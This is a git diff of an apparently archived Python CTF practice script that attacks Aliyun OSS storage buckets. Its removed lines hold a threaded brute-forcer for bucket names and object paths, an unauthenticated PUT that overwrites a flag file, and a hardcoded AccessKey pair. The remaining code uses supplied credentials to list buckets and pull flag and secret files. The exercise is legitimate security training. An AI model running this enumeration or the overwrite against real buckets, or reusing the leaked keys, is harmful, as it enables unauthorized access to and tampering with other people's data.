@@ -1,81 +1,22 @@
-# import requests
-# from concurrent.futures import ThreadPoolExecutor, as_completed
+# OSS CTF 练习脚本（已归档）
 
-# bucket_prefix = "haobachang"
-# bucket_suffix = "x001.oss-cn-chengdu.aliyuncs.com"
+# 以下为历史练习记录，凭证已失效，仅保留脚本结构供学习参考。
+# 原 AccessKey 已删除，使用时请通过环境变量传入自己的临时凭证。
 
-# # 生成所有可能的桶
-# buckets = [f"{bucket_prefix}{i}x{j}{bucket_suffix}" for i in range(10) for j in range(10)]
+import os
 
-# def check_bucket(bucket_name):
-#     url = f"http://{bucket_name}"
-#     try:
-#         resp = requests.get(url, timeout=1)
-#         if resp.status_code != 404:
-#             return url
-#     except:
-#         pass
-#     return None
+access_key_id = os.environ.get("CTF_OSS_AK", "")
+access_key_secret = os.environ.get("CTF_OSS_SK", "")
 
-# # 多线程检查桶
-# print("[*] 快速扫描存储桶...")
-# found_buckets = []
-# with ThreadPoolExecutor(max_workers=20) as executor:
-#     futures = [executor.submit(check_bucket, b) for b in buckets]
-#     for future in as_completed(futures):
-#         result = future.result()
-#         if result:
-#             print(f"[+] 存在: {result}")
-#             found_buckets.append(result)
+if not access_key_id or not access_key_secret:
+    print("请先设置环境变量 CTF_OSS_AK / CTF_OSS_SK")
+    raise SystemExit(1)
 
-# # 对找到的桶爆破路径
-# paths = [f"hbc_{i:03d}" for i in range(1, 1000)]
-
-# def check_path(bucket_url, path):
-#     url = f"{bucket_url}/{path}"
-#     try:
-#         resp = requests.get(url, timeout=1)
-#         if resp.status_code == 200:
-#             print(f"  [+] {url}")
-#             if 'flag' in resp.text:
-#                 print(f"     内容: {resp.text[:100]}")
-#     except:
-#         pass
-
-# print(f"\n[*] 爆破 {len(found_buckets)} 个桶的路径...")
-# for bucket_url in found_buckets:
-#     print(f"\n--- {bucket_url} ---")
-#     with ThreadPoolExecutor(max_workers=30) as executor:
-#         executor.map(lambda p: check_path(bucket_url, p), paths)
-
-# import requests
-
-# url = "http://haobachang520.oss-cn-chengdu.aliyuncs.com/9657beec-984f-4398-af89-f5376e6bec04/flag.txt"
-
-# # 要上传的新内容（可以包含你的名字或 "test"）
-# new_content = "这是一个测试文件，包含我的名字：张三。"
-
-# # 发送 PUT 请求
-# response = requests.put(url, data=new_content)
-
-# print(f"状态码: {response.status_code}")
-# if response.status_code == 200:
-#     print("覆盖成功！")
-# else:
-#     print(f"失败，原因: {response.text}")
-
-import oss2
-from oss2 import ObjectIterator
-
-# 上一关获取的凭证
-access_key_id = "LTAI5t74gdTkSqzHFMyPNaNQ"
-access_key_secret = "dmPncMOYDwOv7zla1jwOBRRd5olac2"
 endpoint = "oss-cn-chengdu.aliyuncs.com"
 
-# 可能的 bucket 列表（根据前两关推测）
 buckets_to_try = [
     "haobachang520",
-    "haobachang522", 
+    "haobachang522",
     "haobachang7x8x001",
     "haobachang0x0x001",
     "hbc618773"
@@ -83,21 +24,21 @@ buckets_to_try = [
 
 print("[*] 开始检查存储桶...")
 
+import oss2
+from oss2 import ObjectIterator
+
 for bucket_name in buckets_to_try:
     print(f"\n--- 检查: {bucket_name} ---")
     auth = oss2.Auth(access_key_id, access_key_secret)
     bucket = oss2.Bucket(auth, endpoint, bucket_name)
-    
+
     try:
-        # 尝试列出文件（只需要第一个对象来测试权限）
         for obj in ObjectIterator(bucket, max_keys=1):
             print(f"[+] 可访问! 第一个文件: {obj.key}")
             break
         else:
-            # 能访问但目录为空
             print("[+] 可访问，但目录为空")
-        
-        # 尝试下载常见的 flag 文件
+
         common_files = ['flag.txt', 'flag', 'hbc_015', 'secret.txt', 'key.txt']
         for filename in common_files:
             try:
@@ -108,7 +49,7 @@ for bucket_name in buckets_to_try:
                 pass
             except Exception as e:
                 print(f"     读取 {filename} 失败: {e}")
-                
+
     except oss2.exceptions.AccessDenied:
         print("[-] 拒绝访问 (凭证无权限)")
     except oss2.exceptions.NoSuchBucket:
